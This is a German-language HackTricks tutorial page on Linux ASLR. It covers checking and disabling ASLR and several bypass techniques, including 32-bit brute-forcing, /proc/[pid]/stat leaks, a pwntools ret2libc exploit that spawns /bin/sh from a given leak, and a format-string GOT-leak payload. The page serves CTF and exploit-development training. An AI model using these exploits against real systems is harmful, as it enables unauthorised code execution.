# ASLR

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## Grundinformationen

**Address Space Layout Randomization (ASLR)** ist eine Sicherheitstechnik, die in Betriebssystemen verwendet wird, um die **Speicheradressen** zu **randomisieren**, die von System- und Anwendungsprozessen verwendet werden. Dadurch wird es einem Angreifer erheblich erschwert, den Standort bestimmter Prozesse und Daten, wie z. B. den Stack, den Heap und Bibliotheken, vorherzusagen, wodurch bestimmte Arten von Exploits, insbesondere Puffer√ºberl√§ufe, gemildert werden.

### **√úberpr√ºfen des ASLR-Status**

Um den ASLR-Status auf einem Linux-System zu **√ºberpr√ºfen**, k√∂nnen Sie den Wert aus der Datei `/proc/sys/kernel/randomize_va_space` lesen. Der in dieser Datei gespeicherte Wert bestimmt die Art des angewendeten ASLR:

* **0**: Keine Randomisierung. Alles ist statisch.
* **1**: Konservative Randomisierung. Gemeinsame Bibliotheken, Stack, mmap(), VDSO-Seite sind randomisiert.
* **2**: Vollst√§ndige Randomisierung. Zus√§tzlich zu den durch konservative Randomisierung randomisierten Elementen wird der durch `brk()` verwaltete Speicher randomisiert.

Sie k√∂nnen den ASLR-Status mit dem folgenden Befehl √ºberpr√ºfen:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Deaktivieren von ASLR**

Um ASLR zu **deaktivieren**, setzen Sie den Wert von `/proc/sys/kernel/randomize_va_space` auf **0**. Das Deaktivieren von ASLR wird au√üerhalb von Test- oder Debugging-Szenarien im Allgemeinen nicht empfohlen. So k√∂nnen Sie es deaktivieren:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Sie k√∂nnen ASLR auch f√ºr eine Ausf√ºhrung mit folgendem Befehl deaktivieren:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Aktivieren von ASLR**

Um ASLR zu **aktivieren**, k√∂nnen Sie den Wert **2** in die Datei `/proc/sys/kernel/randomize_va_space` schreiben. Dies erfordert normalerweise Root-Rechte. Die vollst√§ndige Randomisierung kann mit dem folgenden Befehl aktiviert werden:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Persistenz √ºber Neustarts hinweg**

√Ñnderungen, die mit den `echo`-Befehlen vorgenommen werden, sind vor√ºbergehend und werden beim Neustart zur√ºckgesetzt. Um die √Ñnderung persistent zu machen, m√ºssen Sie die Datei `/etc/sysctl.conf` bearbeiten und die folgende Zeile hinzuf√ºgen oder √§ndern:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Nach der Bearbeitung von `/etc/sysctl.conf` wenden Sie die √Ñnderungen mit an:
```bash
sudo sysctl -p
```
Dies stellt sicher, dass Ihre ASLR-Einstellungen √ºber Neustarts hinweg bestehen bleiben.

## **Umgehungen**

### 32-Bit-Brute-Forcing

PaX unterteilt den Adressraum des Prozesses in **3 Gruppen**:

* **Code und Daten** (initialisiert und nicht initialisiert): `.text`, `.data` und `.bss` ‚Äî> **16 Bits** Entropie in der `delta_exec`-Variablen. Diese Variable wird bei jedem Prozess zuf√§llig initialisiert und zu den Anfangsadressen addiert.
* **Speicher**, der von `mmap()` zugewiesen wird, und **gemeinsame Bibliotheken** ‚Äî> **16 Bits**, genannt `delta_mmap`.
* **Der Stack** ‚Äî> **24 Bits**, bezeichnet als `delta_stack`. Es verwendet jedoch effektiv **11 Bits** (vom 10. bis zum 20. Byte einschlie√ülich), ausgerichtet auf **16 Bytes** ‚Äî> Dies ergibt **524.288 m√∂gliche reale Stack-Adressen**.

Die vorherigen Daten gelten f√ºr 32-Bit-Systeme, und die reduzierte endg√ºltige Entropie erm√∂glicht es, ASLR zu umgehen, indem die Ausf√ºhrung immer wieder wiederholt wird, bis der Exploit erfolgreich abgeschlossen ist.

#### Brute-Force-Ideen:

* Wenn Sie einen gro√üen √úberlauf haben, um einen **gro√üen NOP-Sled vor dem Shellcode** zu hosten, k√∂nnten Sie einfach Adressen im Stack brute-forcen, bis der Fluss **√ºber einen Teil des NOP-Sled springt**.
* Eine weitere Option daf√ºr, falls der √úberlauf nicht so gro√ü ist und der Exploit lokal ausgef√ºhrt werden kann, ist es, **den NOP-Sled und den Shellcode in einer Umgebungsvariablen hinzuzuf√ºgen**.
* Wenn der Exploit lokal ist, k√∂nnen Sie versuchen, die Basisadresse von libc brute-forcen (n√ºtzlich f√ºr 32-Bit-Systeme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Wenn Sie einen Remote-Server angreifen, k√∂nnten Sie versuchen, die **Adresse der `libc`-Funktion `usleep`** durch Brute-Force zu ermitteln, indem Sie als Argument 10 √ºbergeben (zum Beispiel). Wenn der **Server irgendwann 10 Sekunden l√§nger f√ºr die Antwort ben√∂tigt**, haben Sie die Adresse dieser Funktion gefunden.

{% hint style="success" %}
In 64-Bit-Systemen ist die Entropie viel h√∂her und dies ist nicht m√∂glich.
{% endhint %}

### Lokale Informationen (`/proc/[pid]/stat`)

Die Datei **`/proc/[pid]/stat`** eines Prozesses ist immer f√ºr jeden lesbar und enth√§lt **interessante** Informationen wie:

* **startcode** & **endcode**: Adressen oberhalb und unterhalb des **TEXT** der Bin√§rdatei
* **startstack**: Die Adresse des Beginns des **Stacks**
* **start\_data** & **end\_data**: Adressen oberhalb und unterhalb, wo sich der **BSS** befindet
* **kstkesp** & **kstkeip**: Aktuelle **ESP**- und **EIP**-Adressen
* **arg\_start** & **arg\_end**: Adressen oberhalb und unterhalb, wo sich die **CLI-Argumente** befinden.
* **env\_start** & **env\_end**: Adressen oberhalb und unterhalb, wo sich die **Umgebungsvariablen** befinden.

Daher, wenn der Angreifer sich auf demselben Computer wie die ausgenutzte Bin√§rdatei befindet und diese Bin√§rdatei nicht mit einem √úberlauf von Rohargumenten rechnet, sondern mit einem anderen **Eingang, der nach dem Lesen dieser Datei erstellt werden kann**. Ist es m√∂glich, dass ein Angreifer **einige Adressen aus dieser Datei erh√§lt und von ihnen Offsets f√ºr den Exploit konstruiert**.

{% hint style="success" %}
F√ºr weitere Informationen zu dieser Datei √ºberpr√ºfen Sie [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) und suchen Sie nach `/proc/pid/stat`
{% endhint %}

### Einen Leak haben

* **Die Herausforderung besteht darin, einen Leak zu geben**

Wenn Ihnen ein Leak gegeben wird (einfache CTF-Herausforderungen), k√∂nnen Sie Offsets daraus berechnen (angenommen, Sie wissen zum Beispiel die genaue libc-Version, die im System verwendet wird, das Sie ausnutzen). Dieses Beispiel-Exploit stammt aus dem [**Beispiel hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (√ºberpr√ºfen Sie diese Seite f√ºr weitere Details):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Durch den Missbrauch eines Buffer√ºberlaufs w√§re es m√∂glich, ein **ret2plt** auszunutzen, um eine Adresse einer Funktion aus der libc zu exfiltrieren. √úberpr√ºfen Sie:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Genau wie bei ret2plt, wenn Sie einen arbitr√§ren Lesezugriff √ºber eine Format-Strings-Sicherheitsanf√§lligkeit haben, ist es m√∂glich, die Adresse einer **libc-Funktion** aus der GOT zu exfiltrieren. Das folgende [**Beispiel stammt von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Du kannst mehr Informationen √ºber Format Strings willk√ºrliches Lesen finden in:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Versuche, ASLR zu umgehen, indem du Adressen im Stack ausnutzt:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
